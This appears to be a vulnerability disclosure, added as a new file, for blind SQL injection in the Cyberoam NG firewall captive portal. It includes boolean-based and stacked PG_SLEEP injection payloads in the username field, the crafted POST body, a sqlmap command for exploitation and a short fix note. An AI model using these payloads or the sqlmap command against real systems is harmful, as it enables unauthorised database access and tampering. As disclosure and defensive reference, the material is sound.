@@ -1,0 +1,48 @@
+# Exploit Title: Cyberoam : Blind SQL Injection
+# Date: 31/Aug/2015
+# Exploit Author: Dharmendra Kumar Singh
+# Contact: dsingh63@outlook.com
+# Vendor Homepage: http://www.cyberoam.com
+# Software Link: http://www.cyberoam.com/NGFW/
+# Version: CR500iNG-XP - 10.6.2 MR-1
+# Category: Firewall
+
+1. Description
+
+The username field in the captive portal of Cyberoam NG firewall is vulnerable to SQL Injection and can be exploited to execute sql commands on the database.
+
+The username field is vulnerable to the following types of SQL Injections
+
+a) Boolean-based blind sql injection
+b) Stacked queries
+
+2. Proof of Concept
+
+The data send to the server while logging in through the captive portal is like "mode=191&username=cyberuser&password=cyberpass&a=1439886198757&producttype=0"
+The query generated in backend server must be something like this
+SELECT password FROM table_name WHERE username = 'cyberuser'
+
+a) Boolean-based blind sql injection
+If a valid username/password combination is known than boolean-based blind sql injection can be done. If username is set to cyberuser' AND 'x'='x , data send will be "mode=191&username=cyberuser' AND 'x'='x&password=cyberpass&a=1439886198757&producttype=0"
+And sql query will become
+
+SELECT password FROM table_name WHERE username = 'cyberuser' AND 'x'='x'
+A successfull login message will be received in response in this case. But if username is set to cyberuser' AND 'x'='y than login fail message will be received in response, since x is not equal to y, hence this confirms that username field is vulnerable to boolean-based blind sql injection
+
+b) Stacked queries
+if username is set to cyberuser';SELECT PG_SLEEP(5) --  the resultant sql query will become
+SELECT password FROM table_name WHERE username = 'cyberuser';SELECT PG_SLEEP(5) -- '
+The stacked sql query "SELECT PG_SLEEP(5)" will make the current session’s process sleep until 5 seconds have elapsed. This confirms that Postgresql Server is used and stacked queries can be executed by providing crafted input to username field.
+
+3. Exploit
+
+Since the techniques are blind hence it is recommended to use an automated tool like SQLMap to exploit the vulnerability. The following command can be used to initiate the exploit
+sqlmap.py -u "http://example.com:8090/login.xml" --data "mode=191&username=cyberuser&password=cyberpass&a=1439886198757&producttype=0"
+
+4. Solution
+
+The backend server scripts do not sanitize user-supplied data before using it in the SQL query. Hence by properly sanitizing the data received in GET variable "username", the vulnerability can be patched.
+
+5. Conclusion
+
+The Cyberoam NG Firewall devices <= Version: CR500iNG-XP - 10.6.2 MR-1 are vulnerable to blind SQL Injection and this vulnerability can be exploited by an attacker to compromise the application, access or modify data
